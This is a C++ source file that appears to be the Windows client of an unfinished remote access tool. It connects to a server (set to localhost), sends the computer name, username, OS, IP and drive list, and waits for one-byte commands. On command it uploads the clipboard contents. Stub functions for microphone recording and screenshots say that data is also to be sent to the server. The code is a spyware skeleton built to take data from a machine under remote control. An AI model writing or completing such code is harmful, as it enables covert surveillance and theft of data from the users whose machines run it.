#include "packet.h"
#include "network.h"
#include "Client.h"
#include "common.h"
#include <WS2tcpip.h>

#pragma comment(lib,"Ws2_32.lib")

wsaWrapper::wsaWrapper() {
    res = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
    }
}

wsaWrapper::~wsaWrapper()
{
       WSACleanup();
}


std::string getIPv4(std::string dns) {

    hostent* remoteHost;
    in_addr addr = {};
    DWORD dwError;
    remoteHost = gethostbyname(dns.c_str());

    if (remoteHost == NULL) {
        dwError = WSAGetLastError();
        if (dwError != 0) {
            if (dwError == WSAHOST_NOT_FOUND) {
                printf("Host not found\n");
               // return 1;
            }
            else if (dwError == WSANO_DATA) {
                printf("No data record found\n");
               // return 1;
            }
            else {
                printf("Function failed with error: %ld\n", dwError);
               // return 1;
            }
        }
    }
    else {
        addr.s_addr = *(u_long*)remoteHost->h_addr_list[0];
        //	printf("\tFirst IP address: %s\n", inet_ntoa(addr));
    }
    return inet_ntoa(addr);
}



namespace network {

    int _connect(std::string dns, short PORT)
    {
        wsaWrapper wsa;
      //  SOCKET srvSocket = INVALID_SOCKET;
        sockaddr_in srvAddr;
        int ret = 0;
        ZeroMemory(&srvAddr, sizeof(srvAddr));
      

   // reconnecting:
            srvSOCKET = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (srvSOCKET == SOCKET_ERROR)
            {
                printf("Error creatng socket %d\n", WSAGetLastError());
                return -1;
            }


 
            srvAddr.sin_family = AF_INET;
            srvAddr.sin_port = htons(PORT);
          //  srvAddr.sin_addr = inet_addr("127.0.0.1");

            if (inet_pton(AF_INET, "127.0.0.1", &srvAddr.sin_addr) <= 0) {
                printf(
                    "\nInvalid address/ Address not supported \n");
                return -1;
            }
       

                ret = connect(srvSOCKET, (sockaddr*)&srvAddr, sizeof(srvAddr));
                
                if (ret == SOCKET_ERROR)
                {
                    printf("ERR: %d\n", WSAGetLastError());
                   // Sleep(RETRY_TIME); //reconnect in 5seconds see "common.h"
                    closesocket(srvSOCKET);
                   // goto reconnecting;
                }
                else {
                    printf("Connected");

                    //send machine specs/info on client connect
                    _sendHWSpecs();
                }


            
             

               
                char recvBuffer[RECV_BUFFERSIZE];
                
                while (true) {
                // Packet data = recvPacket(srvSOCKET);
                    ret = recv(srvSOCKET, recvBuffer, RECV_BUFFERSIZE, 0);
                    if (ret > 0) {
                        
                        switch (*recvBuffer)
                        {
                        case /*Packet::Type::txt_data*/ 
                        0x00:
                            //
                            break;
                        case /*Packet::Type::clip_data*/ 
                        0x01:
                            _sendClipbord();
                            break;
                        case /*Packet::Type::hw_data*/ 
                        0x02:
                            _sendHWSpecs();
                            break;
                        case /*Packet::Type::snd_data*/ 
                        0x03:
                            //
                            break;
                        case /*Packet::Type::img_data*/ 
                        0x04:
                            //
                            break;
                        case /*Packet::Type::vid_data*/ 
                        0x05:
                            //
                            break;
                        case /*Packet::Type::mouse_data*/ 
                        0x06:
                            //
                            break;
                        case /*Packet::Type::ft_data*/ 
                        0x07:
                            //
                            break;
                        default:
                            break;
                        }
            

                    }
                    else if (ret == 0)
                    {
                        //connection closed
                    }
                   // else
                        //print error (WSAGetLastError());
                 }

           
      

        
        //initialise wsa, setup client/srv details and CONNECT to IP/PORT
        return 0;
    }


    int _sendClipbord() {
        
        HANDLE hndl;
        int iRet = 0;
        if (OpenClipboard(nullptr))
        {
             hndl = GetClipboardData(CF_TEXT);    
           

             

            iRet = Packet::sendPacket((char*)hndl, Packet::Type::clip_data, srvSOCKET);

            if (iRet != 0)
                printf("Error sending clipboard Packet, Code: %d\n", WSAGetLastError());
        }
          
        return 0;
    }

    int _captureMic() {
        //captureMic see audio.h  FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }
    int _sendScrShot() {
        //take desktop screenshot FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        return 0;
    }

    int _sendHWSpecs() {
        //get HW specs , FORMAT DATA WITH PROPPER HEADER see packet.h header and send to server... -> IP/PORT
        int iRet = 0;
        Client clientSpecs;
        std::string 
        clSpecs =  "ComputerName: " + clientSpecs.computerName;
        clSpecs += "\nComputerOS: " + clientSpecs.computerOS ;
        clSpecs += "\nUsername: " +clientSpecs.userName;
        clSpecs += "\nclient IP: " + clientSpecs.ip;
        clSpecs += "\nComputerDrives: " + clientSpecs.disks;

         iRet =  Packet::sendPacket(clSpecs, Packet::Type::hw_data, srvSOCKET);
         if (iRet != 0)
             printf("Error sending hwSpecs Packet, Code: %d\n",WSAGetLastError());
             
        return 0;
    }

}
